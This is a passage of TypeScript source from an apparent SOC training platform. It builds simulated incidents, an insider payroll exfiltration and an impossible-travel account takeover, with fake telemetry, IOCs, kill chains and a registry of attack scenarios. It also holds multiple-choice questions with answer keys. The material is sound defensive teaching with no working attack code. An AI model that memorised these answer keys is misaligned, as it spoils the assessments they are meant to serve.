      id: "evt_insider_ueba_alert", ts: T(25 * MIN + 30_000),
      source: "siem", vendor: "Microsoft Sentinel UEBA",
      event_type: "ueba_anomaly", severity: "high",
      user_email: insider.email, src_ip: insider.ip,
      mitre_technique: "T1530",
      description: "Microsoft Sentinel UEBA scored m.torres's SharePoint download volume as 56x their 30-day baseline, anomaly score 89/100.",
      raw: {
        "event.action": "BehaviorAnomalyDetected",
        "event.outcome": "alerted",
        "user.email": insider.email,
        "ueba.behavior_type": "MassDownloadActivity",
        "ueba.anomaly_score": "89",
        "ueba.time_window_minutes": "15",
        "ueba.combined_risk": "critical",
        "alert.name": "MassDownloadActivity",
        "source.ip": insider.ip,
      },
    },

    // ── CORRELATED: Print event — m.torres printed sensitive docs too ─────────────
    {
      id: "evt_insider_print", ts: T(33 * MIN),
      source: "dlp", vendor: "Microsoft Purview",
      event_type: "dlp_alert", severity: "medium",
      hostname: insider.hostname, user_email: insider.email,
      description: "m.torres printed 3 files, including Headcount_Reduction_Plan_Nov26.xlsx, to the HP-FIN-FLOOR2 shared printer — flagged by endpoint DLP print-activity monitoring.",
      raw: {
        "event.action": "PrintJobSubmitted",
        "host.name": insider.hostname,
        "user.name": "CRYOTECH\\mtorres",
        "printer.name": "HP-FIN-FLOOR2",
        "printer.share": "\\\\PRINT-SRV-01\\HP-FIN-FLOOR2",
        "print.job_count": "3",
        "print.file_names": "Headcount_Reduction_Plan_Nov26.xlsx, payroll-2026-Q2.xlsx, Employee_Salary_Master_2026.xlsx",
        "print.pages": "47",
        "print.classification": "HRConfidential",
        "policy.name": "Endpoint-DLP-Print-Restricted-Content",
        "policy.action": "AuditAndNotify",
        "event.outcome": "success",
      },
    },
  ];

  const alerts = eventsToAlerts(events, scenarioId);
  const iocs: IOC[] = [
    { type: "user",  value: insider.email,                    reputation: "suspicious", tags: ["insider", "pending-termination"] },
    { type: "host",  value: insider.hostname,                 reputation: "suspicious", tags: ["exfil-workstation"] },
    { type: "email", value: "m.torres.backup@gmail.com",      reputation: "suspicious", tags: ["personal-exfil-target"] },
  ];

  const killchain = [
    { ts: T(10 * MIN), phase: "Collection",                   action: "Bulk SharePoint download begins — 47 payroll files in 15 minutes" },
    { ts: T(25 * MIN), phase: "Detection",                    action: "DLP 'Finance-PII-Bulk-Download' fires — action is notify-only, not block" },
    { ts: T(30 * MIN), phase: "Exfiltration — USB",           action: "47 files + 8 additional sensitive files copied to SanDisk USB (26MB total)" },
    { ts: T(35 * MIN), phase: "Exfiltration — Cloud (Blocked)", action: "9.8MB Google Drive upload blocked by Zscaler DLP proxy" },
    { ts: T(40 * MIN), phase: "Exfiltration — Email",         action: "4.2MB of financial data emailed to personal gmail — DLP notified, not blocked" },
  ];

  const questions: ScenarioQuestion[] = [
    { id: "q1", prompt: "Which single indicator MOST strongly suggests intentional insider data theft rather than accidental bulk download?", kind: "single",
      options: [
        { value: "volume",  label: "47 files pulled from the Finance SharePoint site in one 12-minute session" },
        { value: "hr_flag", label: "Pending HR termination flag combined with bulk PII access and immediate USB copy" },
        { value: "hours",   label: "The downloads all occurred during normal business hours from the user's assigned workstation" },
        { value: "browser", label: "Browsing history showing visits to Indeed.com and LinkedIn Jobs earlier the same week" },
      ],
      answer: "hr_flag", xp: 75,
      explanation: "The combination of an active HR termination flag + bulk PII access + immediate USB copy (23 seconds after mount) is the strongest multi-indicator of deliberate intent. Volume alone could be accidental. Business hours are expected. Job browsing is common. The convergence of all indicators, especially the termination flag, is the key signal." },
    { id: "q2", prompt: "The DLP policy blocked the Google Drive upload but the USB exfiltration succeeded. What is the root cause of this detection gap?", kind: "single",
      options: [
        { value: "threshold", label: "The DLP bulk-download threshold (20 files) was too high — USB copy wasn't DLP-inspected" },
        { value: "no_policy", label: "CrowdStrike device control policy only detects copy activity, not removal; DLP doesn't inspect USB content" },
        { value: "bypass",    label: "The user encrypted the USB files to bypass DLP inspection" },
        { value: "cloud",     label: "DLP only monitors cloud uploads, not endpoint activity" },
      ],
      answer: "no_policy", xp: 75,
      explanation: "CrowdStrike device control monitored the USB copy event but did not block it. The DLP policy that fired ('Finance-PII-Bulk-Download') was set to 'Notify user' not 'Block'. The combination of a detection-only device control policy and a notify-only DLP policy allowed the USB exfiltration to complete. A block policy on both would have prevented it." },
    { id: "q3", prompt: "Which MITRE techniques are present in this incident? (select all that apply)", kind: "multi",
      options: [
        { value: "T1530",     label: "T1530 — Data from Cloud Storage (SharePoint bulk download)" },
        { value: "T1052.001", label: "T1052.001 — Exfiltration over USB Device" },
        { value: "T1567",     label: "T1567 — Exfiltration to Cloud Storage (Google Drive — blocked)" },
        { value: "T1486",     label: "T1486 — Data Encrypted for Impact (ransomware)" },
      ],
      answer: ["T1530", "T1052.001", "T1567"], xp: 100,
      explanation: "T1530 (SharePoint bulk download), T1052.001 (USB copy), and T1567 (attempted Google Cloud upload — blocked) are all present. No ransomware or encryption occurred — this is a pure data exfiltration insider threat scenario." },
    { id: "q4", prompt: "What IMMEDIATE actions should the SOC take upon discovering this incident? (select all)", kind: "multi",
      options: [
        { value: "legal",    label: "Alert Legal/HR and preserve the USB as potential evidence" },
        { value: "disable",  label: "Disable m.torres's account and revoke all active sessions immediately" },
        { value: "scan",     label: "Run a full CrowdStrike on-demand malware scan across all finance department hosts" },
        { value: "preserve", label: "Preserve forensic image of WS-FIN-4421 before any changes" },
      ],
      answer: ["legal", "disable", "preserve"], xp: 100,
      explanation: "Legal/HR must be notified immediately — this is a potential crime requiring chain-of-custody for the USB device. The account must be disabled to prevent further exfiltration. Forensic image preservation is critical before any remediation. AV scan is unnecessary — this is an insider threat, not malware." },
  ];

  return {
    scenario_id: scenarioId,
    title: "Insider Threat — Finance Data Exfiltration",
    threat_actor: "Malicious Insider (Finance Analyst, pending termination)",
    attack_kind: "insider_threat",
    briefing: "Microsoft Purview DLP fired policy Finance-PII-Bulk-Download on m.torres at 13:25, sourced from WS-FIN-4421. Microsoft Sentinel UEBA raised a separate anomaly on the same account shortly after. No containment has been applied.",
    narrative: `HR notified payroll — but not IT Security — that a finance analyst was being terminated the following day. By 13:10, the analyst had already downloaded 47 payroll and compensation files from the Finance SharePoint site. Microsoft Purview DLP fired a High severity alert at 13:25, but the policy action was 'notify user only' — not block. A SanDisk USB drive was inserted 5 minutes later, and 26MB of files were copied within 23 seconds of mounting. An attempted Google Drive upload was blocked by Zscaler. A second exfiltration channel — email to a personal gmail account — succeeded because the DLP policy was also set to notify-only. Your job: determine what was successfully exfiltrated, identify every detection gap, and recommend both immediate containment and long-term policy changes.`,
    learning_objectives: [
      "Recognize multi-indicator insider threat patterns combining HR context with technical telemetry",
      "Understand the difference between DLP detection-only vs. block policies and their impact",
      "Identify multiple simultaneous exfiltration channels (USB, cloud upload, email)",
      "Understand forensic evidence preservation requirements for insider threat investigations",
      "Identify permission scope issues (over-broad cross-site access) that enabled the incident",
    ],
    alerts, events, iocs, killchain, questions,
  };
}

// =========================================================================
// Scenario registry
// =========================================================================

export const SCENARIOS = [
  { slug: "phishing-malware-basic",
    title: "Phishing Attachment → Malware Execution → Workstation Compromise",
    difficulty: "beginner", attack_kind: "phishing_malware_basic",
    threat_actor: "Commodity Malware Operator", build: buildPhishingMalwareScenario,
    summary: "An everyday phishing email leads to a disguised .pdf.exe running on one workstation — the simplest attack in the platform, single host, no lateral movement." },
  { slug: "usb-malware-basic",
    title: "Malicious USB Drive → Trojan Persistence → Workstation Compromise",
    difficulty: "beginner", attack_kind: "usb_malware_basic",
    threat_actor: "Commodity Malware / Opportunistic Physical Access", build: buildUsbMalwareScenario,
    summary: "An untagged USB drive delivers a trojan that sets up Registry Run key persistence on one workstation before EDR catches it." },
  { slug: "phishing-to-cloud-exfil",
    title: "Phishing → Cloud Exfiltration",
    difficulty: "intermediate", attack_kind: "phishing_to_exfil",
    threat_actor: "TA-COBALTSPIDER", build: buildPhishingToExfil,
    summary: "A finance analyst opens a macro-laced invoice. Trace the attacker through PowerShell, LSASS credential theft, and a 184MB S3 data exfiltration." },
  { slug: "bec-mailbox-rule",
    title: "Password Spray → BEC Mailbox Rule",
    difficulty: "beginner", attack_kind: "identity_bec",
    threat_actor: "TA-VOIDPELICAN", build: buildBecScenario,
    summary: "Spot the spray, the off-hours MFA acceptance, and the hidden inbox rule before a $247K wire fraud lands." },
  { slug: "ransomware-lockbit",
    title: "Ransomware Outbreak — LockBit 3.0",
    difficulty: "advanced", attack_kind: "ransomware",
    threat_actor: "LockBit 3.0 Affiliate", build: buildRansomwareScenario,
    summary: "Trace LockBit from a late-night phishing email through LSASS dump, PsExec lateral movement, shadow copy deletion, and 18GB of file encryption." },
  { slug: "oauth-app-persistence",
    title: "OAuth App Persistence — Cloud APT",
    difficulty: "advanced", attack_kind: "oauth_persistence",
    threat_actor: "APT-CLOUDGHOUL", build: buildOAuthScenario,
    summary: "A rogue OAuth app survives a password reset — silently exfiltrating 340MB of product roadmaps via Microsoft Graph API." },
  { slug: "insider-threat-finance",
    title: "Insider Threat — Finance Data Exfiltration",
    difficulty: "intermediate", attack_kind: "insider_threat",
    threat_actor: "Malicious Insider", build: buildInsiderThreatScenario,
    summary: "A finance employee facing termination bulk-downloads payroll data, copies it to USB, and attempts cloud upload. Find every detection gap." },
  { slug: "kerberoasting",
    title: "Kerberoasting → Service Account Compromise",
    difficulty: "advanced", attack_kind: "credential_theft_kerberoasting",
    threat_actor: "Internal Attacker (Compromised Developer)",
    build: buildKerberoastingScenario,
    summary: "A developer's account enumerates SPNs via LDAP, requests 12 TGS tickets using weak RC4 encryption, cracks svc-mssql offline, and executes code via xp_cmdshell." },
  { slug: "dns-tunneling",
    title: "DNS Tunneling — C2 via DNS",
    difficulty: "advanced", attack_kind: "c2_dns_tunneling",
    threat_actor: "APT-TUNNELRAT",
    build: buildDNSTunnelingScenario,
    summary: "An attacker uses dnscat2 to exfiltrate data via DNS — 847 queries/minute with base32-encoded subdomains carrying stolen credentials to an attacker-controlled domain." },
  { slug: "lolbins",
    title: "Living-off-the-Land (LOLBins)",
    difficulty: "advanced", attack_kind: "lolbins_defense_evasion",
    threat_actor: "TA-GHOSTSHELL",
    build: buildLOLBinsScenario,
    summary: "A 7-step LOLBin chain: certutil download → regsvr32 Squiblydoo → mshta VBScript → wmic recon → bitsadmin persistence → rundll32 DLL → schtasks SYSTEM task." },
  { slug: "cloud-cryptomining",
    title: "Cloud Credential Leak — Cryptomining + Data Breach",
    difficulty: "intermediate", attack_kind: "cloud_cryptomining",
    threat_actor: "UNC3782 (Financially Motivated)",
    build: buildCloudCryptoMiningScenario,
    summary: "AWS keys leaked to GitHub. In 24 minutes: automated bot steals creds, 14 GPU instances mine Monero at $342/hr, backdoor IAM user created, and 4.7GB of customer PII exfiltrated from a public S3 bucket." },
  { slug: "dcsync-golden-ticket",
    title: "DCSync → Golden Ticket (Domain Dominance)",
    difficulty: "advanced", attack_kind: "dcsync_golden_ticket",
    threat_actor: "APT-IRONBEAR (nation-state, Russia nexus)",
    build: buildDCSyncScenario,
    summary: "APT uses stolen IT admin credentials to DCSync the domain controller, extract the krbtgt hash, forge a 10-year Golden Ticket, create a shadow admin, and wipe Security logs — full domain compromise in 25 minutes." },
  { slug: "supply-chain-vendor-update",
    title: "Supply Chain Attack — Malicious Vendor Update",
    difficulty: "advanced", attack_kind: "supply_chain",
    threat_actor: "APT-SHADOWSUPPLY (nation-state supply chain operator)",
    build: buildSupplyChainScenario,
    summary: "A trojanized vendor update installs a malicious shared object disguised as telemetry, establishes C2, steals AWS credentials, and exfiltrates 2.3GB of production data — all via a legitimately-signed package." },
  { slug: "mfa-fatigue-ato",
    title: "MFA Fatigue → Okta Account Takeover",
    difficulty: "beginner", attack_kind: "mfa_fatigue_ato",
    threat_actor: "UNC3944",
    build: buildMfaFatigueScenario,
    summary: "UNC3944 bombards Jennifer Chen with 60 MFA push notifications until she approves at 1:32 AM. Within minutes the attacker enrolls a new device, bulk-downloads 847 SharePoint files, creates a persistent API token, and modifies Conditional Access policies — all from a Moscow IP." },
  { slug: "asrep-roasting",
    title: "AS-REP Roasting → Offline Hash Crack",
    difficulty: "intermediate", attack_kind: "asrep_roasting",
    threat_actor: "APT28 (Fancy Bear)",
    build: buildAsRepRoastingScenario,
    summary: "APT28 foothold on WS-DEV-09 discovers 3 service accounts with Kerberos pre-auth disabled. Impacket GetNPUsers.py captures RC4-encrypted TGT hashes offline. Six hours later the cracked svc-backup password enables lateral movement to NTDS.dit." },
  { slug: "ntlm-relay-responder",
    title: "NTLM Relay — Internal Credential Hijacking",
    difficulty: "advanced", attack_kind: "ntlm_relay",
    threat_actor: "FIN7 (compromised internal machine)",
    build: buildNtlmRelayScenario,
    summary: "An LLMNR poisoner on WS-DEV-09 intercepts l.nguyen's NTLM authentication and relays it to SRV-FILE01. Remote SYSTEM execution via PsExec, LSASS dump with 0x1FFFFF access, and SMB pivot to 3 internal servers — no external C2." },
  { slug: "k8s-pod-escape-imds",
    title: "Kubernetes Pod Escape → Cloud Metadata Theft",
    difficulty: "advanced", attack_kind: "k8s_pod_escape",
    threat_actor: "APT40",
    build: buildK8sPodEscapeScenario,
    summary: "Compromised CI/CD token gives APT40 kubectl exec into production. nsenter escapes to EC2 host, curl to 169.254.169.254 steals IAM credentials. Attacker enumerates S3 buckets from Tor IP, downloads db-passwords.json, and backdoors both the cluster and IAM." },
  { slug: "oauth-consent-grant-phishing",
    title: "OAuth Consent Grant Phishing — Silent BEC",
    difficulty: "expert", attack_kind: "oauth_consent_phishing",
    threat_actor: "APT29 / Cozy Bear",
    build: buildOAuthConsentPhishingScenario,
    summary: "j.chen clicks a phishing link and grants 'Productivity Suite Pro' (48h-old unverified app on typosquat domain) Mail.ReadWrite + Files.ReadWrite.All. The app silently reads 1,247 emails, copies 312 SharePoint files, creates an inbox forwarding rule, and maps the org via Calendar — no malware, no suspicious IPs, 100% Microsoft Graph API." },
  { slug: "backup-agent-false-positive",
    title: "Mass File Encryption Alert — Enterprise Backup Agent",
    difficulty: "beginner", attack_kind: "false_positive",
    threat_actor: "None — authorised backup activity", build: withAlerts(buildBackupFalsePositiveScenario),
    summary: "A CRITICAL ransomware-behaviour alert on a production file server. Every scenario before this one was a real attack — this one is not, and the job is to prove it." },
  { slug: "brute-force-single-account",
    title: "Logon Failure Burst — Published Remote Desktop Server",
    difficulty: "beginner", attack_kind: "credential_access",
    threat_actor: "Opportunistic external attacker", build: withAlerts(buildBruteForceSingleAccountScenario),
    summary: "Hundreds of failed logons against one account, and then one that succeeds. The failures are the noise; finding the success — and what the session did next — is the job." },
  { slug: "rogue-admin-account",
    title: "Out-of-Hours Account Creation — Service Desk Credentials",
    difficulty: "beginner", attack_kind: "persistence",
    threat_actor: "Attacker using stolen service desk credentials", build: withAlerts(buildRogueAdminAccountScenario),
    summary: "A privileged account is created at 22:47 by an admin who is allowed to create accounts. Nothing here is technically forbidden — the question is whether it was authorised." },
  { slug: "impossible-travel-basic",
    title: "Sign-In From Two Countries — Accounts Payable Clerk",
    difficulty: "beginner", attack_kind: "account_takeover",
    threat_actor: "Business Email Compromise operator", build: withAlerts(buildImpossibleTravelBasicScenario),
    summary: "The same account signs in from Tel Aviv and then Amsterdam hours apart. Impossible travel is a hypothesis, not a verdict — the telemetry decides whether it is a VPN artefact or a real takeover." },
  { slug: "software-install-false-positive",
    title: "Unsigned Binary Writes to Program Files — Engineering Workstation",
    difficulty: "beginner", attack_kind: "false_positive",
    threat_actor: "None — authorised software deployment", build: withAlerts(buildSoftwareInstallFalsePositiveScenario),
    summary: "An EDR rule fires HIGH on behaviour that genuinely overlaps with a dropper. Closing an alert correctly needs evidence just as rigorous as opening one." },
  { slug: "web-shell-sqli",
    title: "SQL Injection → Web Shell → Server Compromise",
    difficulty: "advanced", attack_kind: "web_exploitation",
    threat_actor: "Opportunistic web attacker", build: withAlerts(buildWebShellRceScenario),
    summary: "The WAF blocked the obvious payloads and missed the one that worked. Pivot between WAF, IIS, SQL audit and EDR to find how a web shell reached the server." },
  { slug: "linux-ssh-cryptominer",
    title: "Exposed SSH → Cron Persistence → Cryptominer",
    difficulty: "intermediate", attack_kind: "linux_ssh_cryptomining",
    threat_actor: "Commodity cryptomining crew", build: withAlerts(buildLinuxSshCryptominerScenario),
    summary: "A Linux server intrusion read through auditd and sshd rather than Windows telemetry — the successful login comes from an IP that never appears in the brute force." },
  { slug: "aitm-token-theft",
    title: "Adversary-in-the-Middle Phishing — Session Token Theft",
    difficulty: "advanced", attack_kind: "aitm_session_hijack",
    threat_actor: "Phishing-as-a-Service operator", build: withAlerts(buildAitmTokenTheftScenario),
    summary: "MFA was satisfied correctly and the account still fell. One session id, two browsers, 365 km apart, six minutes apart." },
  { slug: "esxi-ransomware",
    title: "Hypervisor Ransomware — ESXi Datastore Encryption",
    difficulty: "expert", attack_kind: "ransomware_hypervisor",
    threat_actor: "Akira affiliate (big-game ransomware)", build: withAlerts(buildEsxiRansomwareScenario),
    summary: "Ninety-six VMs go dark at once and the endpoint EDR sees nothing, because there is no agent on the hypervisor. Reason from the telemetry that stopped arriving." },
] as const;

// ─── Impossible Travel — Account Compromise via Stolen Credentials ────────────

export function buildImpossibleTravelScenario(scenarioId = "impossible-travel-2026"): ScenarioBundle {
  const B = new Date("2026-05-12T07:00:00Z").getTime();   // 09:00 Israel time
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const user  = { email: "k.taylor@nexacorp.com", name: "k.taylor", sid: "S-1-5-21-3421479547-3897544621-1789562108-1113" };
  const isrIp = "77.125.38.201";   // ISP: HOT Mobile — Tel Aviv, Israel
  const nigIp = "41.203.64.9";     // ISP: MTN Nigeria — Lagos, Nigeria (7,200 km away)

  const events: TelemetryEvent[] = [
    // ── Step 1: Normal Israeli login — baseline ────────────────────────────────
    {
      id: "evt_imp_01_baseline", ts: T(0),
      source: "vpn", vendor: "Palo Alto Networks PAN-OS",
      event_type: "vpn_login", severity: "informational",
      user_email: user.email,
      src_ip: isrIp,
      geo: { country: "Israel", city: "Tel Aviv", latitude: 32.0853, longitude: 34.7818 },
      description: "k.taylor connected to the VPN from Tel Aviv, Israel, on a registered device with MFA approved.",
      raw: {
        "event.action":                    "vpn_connected",
        "event.outcome":                   "success",
        "user.email":                      user.email,
        "source.ip":                       isrIp,
        "source.geo.country_name":         "Israel",
        "source.geo.city_name":            "Tel Aviv",
        "source.geo.location.lat":         "32.0853",
        "source.geo.location.lon":         "34.7818",
        "GeoLocation.country_name":        "Israel",
        "GeoLocation.city_name":           "Tel Aviv",
        "GeoLocation.location.lat":        32.0853,
        "GeoLocation.location.lon":        34.7818,
        "gp.tunnel_ip":                    "10.100.50.14",
        "gp.client_hostname":              "LT-DEV-0931",
        "gp.device_registered":            "true",
        "gp.auth_method":                  "Azure AD + MFA",
        "gp.mfa_result":                   "approved",
        "gp.gateway":                      "gw-nexacorp-tlv01",
        "gp.client_os":                    "Windows 11 22H2",
        "gp.session_id":                   "gp-sess-9a3f2b1c",
      },
    },

    // ── Step 2: VPN login from Nigeria — 4 minutes later — IMPOSSIBLE ─────────
    {
      id: "evt_imp_02_impossible", ts: T(4 * MIN),
      source: "vpn", vendor: "Palo Alto Networks PAN-OS",
      event_type: "vpn_login", severity: "high",
      user_email: user.email,
      src_ip: nigIp,
      geo: { country: "Nigeria", city: "Lagos", latitude: 6.5244, longitude: 3.3792 },
      mitre_technique: "T1078",
      description: "k.taylor's account connected to the VPN from Lagos, Nigeria, on an unregistered device.",
      raw: {
        "event.action":                    "vpn_connected",
        "event.outcome":                   "success",
        "user.email":                      user.email,
        "source.ip":                       nigIp,
        "source.geo.country_name":         "Nigeria",
        "source.geo.city_name":            "Lagos",
        "source.geo.location.lat":         "6.5244",
        "source.geo.location.lon":         "3.3792",
        "GeoLocation.country_name":        "Nigeria",
        "GeoLocation.city_name":           "Lagos",
        "GeoLocation.location.lat":        6.5244,
        "GeoLocation.location.lon":        3.3792,
        "gp.tunnel_ip":                    "10.100.50.77",
        "gp.client_hostname":              "UNKNOWN-DEVICE",
        "gp.device_registered":            "false",
        "gp.auth_method":                  "Azure AD",
        "gp.mfa_result":                   "not_required",   // MFA bypass — no push sent
        "gp.gateway":                      "gw-nexacorp-emea01",
        "gp.client_os":                    "Windows 10 1909",
        "gp.session_id":                   "gp-sess-4f7c9d2e",
        "ueba.risk_score":                 "92",
      },
    },

    // ── Step 3: O365 login from same Nigerian IP — attacker reading emails ─────
    {
      id: "evt_imp_03_o365", ts: T(6 * MIN),
      source: "o365", vendor: "Microsoft Entra ID",
      event_type: "auth_success", severity: "high",
      user_email: user.email,
      src_ip: nigIp,
      geo: { country: "Nigeria", city: "Lagos", latitude: 6.5244, longitude: 3.3792 },
      mitre_technique: "T1078",
      description: "k.taylor's account authenticated to Azure AD from a Nigerian IP address.",
      raw: {
        "data.office365.AzureActiveDirectoryEventType": "1",
        "data.office365.Operation":        "UserLoggedIn",
        "data.office365.Workload":         "AzureActiveDirectory",
        "data.office365.RecordType":       "15",
        "data.office365.Version":          "1",
        "data.office365.UserId":           user.email,
        "data.office365.ClientIP":         nigIp,
        "data.office365.ActorIpAddress":   nigIp,
        "data.office365.OrganizationId":   "a7b8c9d0-1234-5678-abcd-ef0123456789",
        "data.office365.ResultStatus":     "Success",
        "data.office365.ErrorNumber":      "0",
        "data.office365.UserType":         "0",
        "data.office365.ExtendedProperties.Name":  "ResultStatusDetail",
        "data.office365.ExtendedProperties.Value": "Success",
        "data.office365.DeviceProperties.Name":    "TrustType",
        "data.office365.DeviceProperties.Value":   "NotManaged",
        "GeoLocation.country_name":        "Nigeria",
        "GeoLocation.city_name":           "Lagos",
        "GeoLocation.location.lat":        6.5244,
        "GeoLocation.location.lon":        3.3792,
        "event.action": "logged-in",
        "event.outcome": "success",
        "source.ip": nigIp,
        "ueba.risk_score":                 "87",
      },
    },

    // ── Step 4: Attacker creates email forwarding rule — data exfil prep ───────
    {
      id: "evt_imp_04_inboxrule", ts: T(9 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log",
      event_type: "account_modify", severity: "high",
      user_email: user.email,
      src_ip: nigIp,
      mitre_technique: "T1114.002",
      description: "An inbox rule forwarding all of k.taylor's incoming mail to collector.k.taylor@protonmail.com was created from the Nigerian IP.",
      raw: {
        "data.office365.Operation":        "New-InboxRule",
        "data.office365.Workload":         "Exchange",
        "data.office365.RecordType":       "2",
        "data.office365.UserId":           user.email,
        "data.office365.ClientIP":         nigIp,
        "data.office365.ResultStatus":     "Success",
        "data.office365.Parameters.Name":  "ForwardTo",
        "data.office365.Parameters.Value": "collector.k.taylor@protonmail.com",
        "data.office365.RuleCondition":    "All messages",
        "data.office365.RuleName":         "Microsoft Outlook",
        "data.office365.UserType":         "0",
        "GeoLocation.country_name":        "Nigeria",
        "GeoLocation.city_name":           "Lagos",
        "GeoLocation.location.lat":        6.5244,
        "GeoLocation.location.lon":        3.3792,
        "event.action": "inbox-rule-created",
        "event.outcome": "success",
        "source.ip": nigIp,
        "exchange.rule.forward_to":        "collector.k.taylor@protonmail.com",
        "exchange.rule.scope":             "all_messages",
      },
    },

    // ── Step 5: Attacker downloads SharePoint files — data collection ──────────
    {
      id: "evt_imp_05_sharepoint", ts: T(14 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log",
      event_type: "sharepoint_access", severity: "high",
      user_email: user.email,
      src_ip: nigIp,
      mitre_technique: "T1530",
      description: "847 files (2.3GB) were downloaded from the Engineering SharePoint site in 5 minutes from a Nigerian IP.",
      raw: {
        "data.office365.Operation":        "FileDownloaded",
        "data.office365.Workload":         "SharePoint",
        "data.office365.RecordType":       "6",
        "data.office365.UserId":           user.email,
        "data.office365.ClientIP":         nigIp,
        "data.office365.ResultStatus":     "Success",
        "data.office365.ObjectId":         "https://nexacorp.sharepoint.com/sites/Engineering/Shared Documents",
        "data.office365.SiteUrl":          "https://nexacorp.sharepoint.com/sites/Engineering",
        "data.office365.UserType":         "0",
        "sharepoint.files_downloaded":     "847",
        "sharepoint.bytes_total":          "2348000000",
        "sharepoint.download_duration_sec":"312",
        "sharepoint.avg_file_size_kb":     "2767",
        "GeoLocation.country_name":        "Nigeria",
        "GeoLocation.city_name":           "Lagos",
        "GeoLocation.location.lat":        6.5244,
        "GeoLocation.location.lon":        3.3792,
        "event.action": "bulk-download",
        "event.outcome": "success",
        "source.ip": nigIp,
      },
    },
  ];

  const iocs: IOC[] = [
    { type: "ip",    value: nigIp,                               reputation: "malicious", tags: ["attacker-ip", "MTN Nigeria", "Lagos"] },
    { type: "email", value: "collector.k.taylor@protonmail.com", reputation: "malicious", tags: ["attacker-email", "inbox-forward-target"] },
  ];

  return {
    scenario_id: scenarioId,
    title: "Account Compromise — Impossible Travel",
    threat_actor: "External Threat Actor (Credential Theft)",
    attack_kind: "account_compromise",
    briefing: "Azure AD Identity Protection raised an impossible-travel alert on k.taylor at 09:04, and the VPN concentrator logged a second session for the same account minutes after the first. The user has not been contacted yet.",
    narrative: `At 09:00, k.taylor connected VPN normally from Tel Aviv. Four minutes later, the same credentials were used to connect from Lagos, Nigeria — 7,200 km away. This is physically impossible. The attacker, who had stolen k.taylor's credentials, logged in from Nigeria and immediately: authenticated to O365, created a hidden inbox forwarding rule (forwarding all emails to a ProtonMail address), and downloaded 847 engineering files from SharePoint in under 6 minutes.`,
    learning_objectives: [
      "Recognize impossible travel as a credential compromise indicator",
      "Identify MFA bypass via Conditional Access misconfiguration",
      "Detect hidden inbox forwarding rules (T1114.002)",
      "Correlate VPN + O365 + SharePoint events to reconstruct the attack chain",
    ],
    events,
    iocs,
    alerts: eventsToAlerts(events, scenarioId),
    killchain: [
      { ts: T(0),        phase: "Normal Baseline",  action: "k.taylor VPN login from Tel Aviv — looks normal" },
      { ts: T(4 * MIN),  phase: "Impossible Travel", action: "Same user VPN login from Lagos, Nigeria — 4 min later, 7,200 km away" },
      { ts: T(6 * MIN),  phase: "Credential Abuse",  action: "Attacker authenticates to Azure AD / O365 from Nigerian IP" },
      { ts: T(9 * MIN),  phase: "Email Persistence", action: "Inbox forwarding rule created: all mail → protonmail attacker address" },
      { ts: T(14 * MIN), phase: "Data Collection",   action: "847 SharePoint files (2.3 GB) downloaded in 5 minutes" },
    ],
    questions: [
      { id: "q1", prompt: "What is the key indicator that proves this is a compromised credential rather than k.taylor traveling?", kind: "single",
        options: [
          { value: "distance", label: "7,223 km between Tel Aviv and Lagos in 4 minutes — physically impossible travel" },
          { value: "time",     label: "The Nigeria login happened at night (unusual hours)" },
          { value: "vpn",      label: "The second VPN login used a different gateway" },
          { value: "device",   label: "The device name was different" },
        ],
        answer: "distance", xp: 50,
        explanation: "The 4-minute gap between logins from cities 7,223 km apart is physically impossible — no aircraft travels at 108,345 km/h. This is the definitive indicator of impossible travel, not timing or device differences. Distance-to-time ratio is the core of impossible travel detection." },
      { id: "q2", prompt: "What field in the VPN logs most directly proves credential theft (not a legitimate VPN split-tunnel or proxy)?", kind: "single",
        options: [
          { value: "ip",       label: "The source IP is from a Nigerian ISP (MTN Nigeria)" },
          { value: "device",   label: "gp.device_registered: false — unrecognized device" },
          { value: "mfa",      label: "MFA was not required for the Nigerian login" },
          { value: "country",  label: "The country_name field shows Nigeria" },
        ],
        answer: "device", xp: 75,
        explanation: "An unregistered device (gp.device_registered: false) proves the login came from hardware the organization never enrolled — eliminating VPN split-tunnel and corporate proxy scenarios. A registered corporate device behind a Nigerian exit node would still show gp.device_registered: true. The Nigerian IP alone could be a VPN exit node used by a traveling employee." },
      { id: "q3", prompt: "After confirming impossible travel, what is the FIRST containment action?", kind: "single",
        options: [
          { value: "block_ip",  label: "Block the Nigerian IP at the perimeter firewall" },
          { value: "revoke",    label: "Revoke all active sessions and reset the password" },
          { value: "notify",    label: "Email k.taylor to verify if they are in Nigeria" },
          { value: "monitor",   label: "Continue monitoring to gather more evidence" },
        ],
        answer: "revoke", xp: 50,
        explanation: "Revoking all active sessions immediately terminates the attacker's access even while evidence-gathering continues. Blocking the IP fails if the attacker switches exit nodes. Notifying the user wastes precious minutes while SharePoint files are being downloaded. Continued monitoring without action allows the exfiltration to complete." },
      { id: "q4", prompt: "The attacker downloaded 847 SharePoint files (2.3 GB) in 5 minutes. Which log source would provide the most forensically complete list of exactly which files were accessed?", kind: "single",
        options: [
          { value: "o365",      label: "O365 Unified Audit Log (SharePoint FileDownloaded operations)" },
          { value: "vpn",       label: "VPN session bytes-transferred logs" },
          { value: "dlp",       label: "Microsoft Purview DLP FileDownloaded alerts" },
          { value: "firewall",  label: "Perimeter firewall egress logs (bytes out)" },
        ],
        answer: "o365", xp: 75,
        explanation: "The O365 Unified Audit Log records each individual FileDownloaded operation with the exact file path, site URL, and timestamp. VPN logs show total session bytes but cannot identify individual files. DLP may not have triggered if no sensitive data policies matched. Firewall egress shows volume but not file identity." },
    ],
  };
}

// =========================================================================
// Foundation Scenario A: Phishing Attachment → Malware Execution → Workstation Compromise
// The simplest possible attack in the platform — one host, one user, no
// lateral movement, no credential theft, no cloud pivot. This is the story a
// student who is brand-new to SOC work should see first: an everyday
// phishing email leads to a malware infection, and the EDR eventually
// catches it. Nothing here requires knowing Kerberos, cloud IAM, or AD.
// =========================================================================

export function buildPhishingMalwareScenario(scenarioId = "phishing-malware-basic-2026"): ScenarioBundle {
  const B = new Date("2026-05-20T10:15:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const victim = { hostname: "WS-HR-1182", email: "r.avraham@nexacorp.com", ip: "10.10.40.63" };
  const c2Domain = "shiptrack-updates-net.xyz";
  const c2Ip = "185.220.101.204";
  const fileHash = makeSha256("delivery_notice_48213_pdf_exe_trojan");

  const events: TelemetryEvent[] = [
    {
